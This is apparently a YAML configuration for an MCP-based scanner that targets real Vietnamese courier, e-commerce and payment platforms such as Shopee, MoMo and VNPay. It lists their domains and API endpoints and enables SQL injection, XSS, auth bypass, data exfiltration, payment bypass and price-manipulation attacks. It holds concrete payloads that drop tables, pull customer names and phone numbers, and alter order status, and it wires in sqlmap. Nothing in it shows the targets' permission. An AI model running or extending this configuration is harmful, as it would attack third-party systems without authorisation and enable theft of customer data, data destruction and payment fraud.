# 越南零日漏洞挖掘MCP配置文件
# Vietnam Zero-Day Vulnerability Discovery MCP Configuration
# 版本: 1.0.0
# 更新日期: 2025-10-29

# 系统配置
system:
  name: "Vietnam Zero-Day MCP"
  version: "1.0.0"
  description: "越南零日漏洞挖掘MCP服务器 - 专门针对越南快递、物流、电商、订单系统"
  author: "Dragon-V Security Team"

  # 日志配置
  logging:
    level: "INFO"
    format: "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
    file: "vietnam_zero_day_mcp.log"
    max_size: "50MB"
    backup_count: 10

# 目标系统配置
target_systems:
  # 越南快递公司
  express_delivery:
    enabled: true
    companies:
      - name: "VNPost"
        urls: ["vnpost.vn", "buudien.vn", "vietnam-post.vn"]
        priority: "high"
        test_endpoints:
          - "/api/v2/tracking"
          - "/api/shipment"
          - "/customer"

      - name: "Viettel Post"
        urls: ["viettelpost.vn", "vtp.vn"]
        priority: "high"
        test_endpoints:
          - "/api/shipment"
          - "/tracking"
          - "/order"

      - name: "Giao Hang Nhanh"
        urls: ["giaohangnhanh.vn", "ghn.vn"]
        priority: "medium"
        test_endpoints:
          - "/api/v1"
          - "/tracking"
          - "/shop"

      - name: "Giao Hang Tiet Kiem"
        urls: ["ghtk.vn", "giaohangtietkiem.vn"]
        priority: "medium"
        test_endpoints:
          - "/api/portal"
          - "/services/shipment"

  # 越南电商平台
  ecommerce:
    enabled: true
    companies:
      - name: "Shopee Vietnam"
        urls: ["shopee.vn"]
        priority: "critical"
        test_endpoints:
          - "/api/v4"
          - "/cart"
          - "/checkout"
          - "/payment"

      - name: "Lazada Vietnam"
        urls: ["lazada.vn"]
        priority: "high"
        test_endpoints:
          - "/api"
          - "/product"
          - "/cart"
          - "/checkout"

      - name: "Tiki"
        urls: ["tiki.vn"]
        priority: "high"
        test_endpoints:
          - "/api/v2"
          - "/product"
          - "/cart"
          - "/order"

      - name: "Sendo"
        urls: ["sendo.vn"]
        priority: "medium"
        test_endpoints:
          - "/api"
          - "/web-api"
          - "/product"

  # 越南支付系统
  payment:
    enabled: true
    companies:
      - name: "MoMo Wallet"
        urls: ["momo.vn"]
        priority: "critical"
        test_endpoints:
          - "/api/"
          - "/payment/"
          - "/app/"

      - name: "ZaloPay"
        urls: ["zalopay.vn"]
        priority: "high"
        test_endpoints:
          - "/api/"
          - "/payment/"
          - "/qr/"

      - name: "VNPay"
        urls: ["vnpay.vn"]
        priority: "high"
        test_endpoints:
          - "/api/"
          - "/paymentv2"
          - "/querydr"

# 扫描配置
scanning:
  # 并发配置
  concurrency:
    max_concurrent_scans: 5
    max_concurrent_requests: 20
    request_timeout: 30
    retry_attempts: 3

  # 扫描深度
  depth:
    max_pages: 100
    max_forms: 50
    max_apis: 30

  # 扫描类型
  scan_types:
    zero_day_scan:
      enabled: true
      priority: "high"
      techniques:
        - sql_injection
        - xss
        - auth_bypass
        - data_exfiltration

    business_logic_scan:
      enabled: true
      priority: "critical"
      techniques:
        - price_manipulation
        - shipping_bypass
        - coupon_abuse
        - inventory_bypass
        - payment_bypass
        - membership_abuse

    api_scan:
      enabled: true
      priority: "high"
      techniques:
        - endpoint_discovery
        - parameter_analysis
        - authentication_test
        - authorization_test

# 载荷配置
payloads:
  # SQL注入载荷
  sql_injection:
    basic:
      - "' OR '1'='1"
      - "'; DROP TABLE users; --"
      - "' UNION SELECT @@version --"

    vietnam_specific:
      - "' OR '1'='1' AND ten_khach_hang LIKE '%nguyen%'"
      - "' UNION SELECT ten,so_dien_thoai FROM khach_hang --"
      - "'; UPDATE don_hang SET trang_thai='delivered' --"

  # XSS载荷
  xss:
    basic:
      - "<script>alert('XSS')</script>"
      - "<img src=x onerror=alert('XSS')>"

    vietnam_specific:
      - "<script>alert('XSS-Vietnam')</script>"
      - "<script>alert('🇻🇳-Security')</script>"

  # 业务逻辑载荷
  business_logic:
    price_manipulation:
      - {"price": 0, "quantity": 1}
      - {"price": -1000, "discount": 100}
      - {"total_amount": 1000, "calculated_total": 1000000}

    shipping_bypass:
      - {"weight": 0, "distance": 100}
      - {"shipping_fee": 0, "express": True}
      - {"remote_area": False, "address": "Lào Cai"}

    coupon_abuse:
      - {"coupons": ["WELCOME10", "SALE20", "VIP30"]}
      - {"coupon_code": "VIETNAM2024", "bypass": True}
      - {"discount_percentage": 100, "max_discount": 999999}

# 越南本地化配置
localization:
  # 语言设置
  language: "vi_VN"
  encoding: "UTF-8"

  # 货币设置
  currency:
    code: "VND"
    symbol: "₫"
    decimal_places: 0

  # 地区设置
  regions:
    - name: "Hà Nội"
      code: "HN"
      shipping_surcharge: 0

    - name: "TP. Hồ Chí Minh"
      code: "HCM"
      shipping_surcharge: 0

    - name: "Đà Nẵng"
      code: "DN"
      shipping_surcharge: 5000

    - name: "Hải Phòng"
      code: "HP"
      shipping_surcharge: 5000

    - name: "Cần Thơ"
      code: "CT"
      shipping_surcharge: 5000

  # 偏远地区
  remote_areas:
    - "Lào Cai"
    - "Điện Biên"
    - "Sơn La"
    - "Hà Giang"
    - "Cao Bằng"
    - "Bắc Kạn"
    - "Lạng Sơn"
    - "Tuyên Quang"
    - "Thái Nguyên"
    - "Phú Thọ"
    - "Yên Bái"

# 检测规则配置
detection_rules:
  # 价格验证规则
  price_validation:
    min_price: 1000  # 最小价格 (VND)
    max_discount: 70  # 最大折扣百分比
    max_total_discount: 500000  # 最大总折扣 (VND)

  # 运费验证规则
  shipping_validation:
    base_fee: 15000  # 基础运费
    max_free_shipping_threshold: 300000  # 免运费门槛
    weight_fee_multiplier: 2000  # 重量费用倍数
    distance_fee_multiplier: 100  # 距离费用倍数

  # 订单验证规则
  order_validation:
    max_quantity_per_item: 100  # 单个商品最大数量
    max_items_per_order: 50  # 每个订单最大商品数
    max_order_value: 100000000  # 最大订单金额 (VND)

# 报告配置
reporting:
  # 报告格式
  formats:
    - "json"
    - "html"
    - "markdown"

  # 报告内容
  sections:
    - "executive_summary"
    - "vulnerability_details"
    - "exploitation_chains"
    - "remediation_recommendations"
    - "vietnam_specific_analysis"

  # 报告输出
  output:
    directory: "./reports/vietnam"
    filename_format: "vietnam_scan_{timestamp}_{target}"
    include_screenshots: true
    include_payloads: true

# 安全配置
security:
  # 访问控制
  access_control:
    require_authentication: false
    allowed_ips: ["127.0.0.1", "::1"]
    rate_limiting:
      requests_per_minute: 60
      burst_size: 10

  # 数据保护
  data_protection:
    encrypt_sensitive_data: true
    mask_personal_info: true
    retention_days: 30

  # 合规性
  compliance:
    respect_robots_txt: true
    follow_responsible_disclosure: true
    include_legal_disclaimer: true

# 集成配置
integrations:
  # MCP集成
  mcp:
    enabled: true
    server_port: 8080
    max_concurrent_requests: 10
    request_timeout: 30

  # 外部工具集成
  external_tools:
    nuclei:
      enabled: true
      templates_path: "./nuclei-templates/vietnam"

    sqlmap:
      enabled: true
      options: ["--batch", "--random-agent"]

    nmap:
      enabled: false
      options: ["-sS", "-sV", "-O"]

# 性能优化
performance:
  # 缓存配置
  caching:
    enabled: true
    ttl: 3600  # 缓存时间(秒)
    max_size: 1000  # 最大缓存条目数

  # 连接池配置
  connection_pool:
    max_size: 100
    min_size: 10
    max_idle_time: 300

  # 内存管理
  memory:
    max_usage_mb: 512
    cleanup_interval: 300

# 开发和调试
development:
  debug_mode: false
  verbose_logging: false
  save_raw_responses: false
  mock_requests: false

# 更新配置
updates:
  auto_update: false
  check_interval: 86400  # 检查更新间隔(秒)
  backup_before_update: true

# 版本信息
version:
  major: 1
  minor: 0
  patch: 0
  build_date: "2025-10-29"
  git_commit: "latest"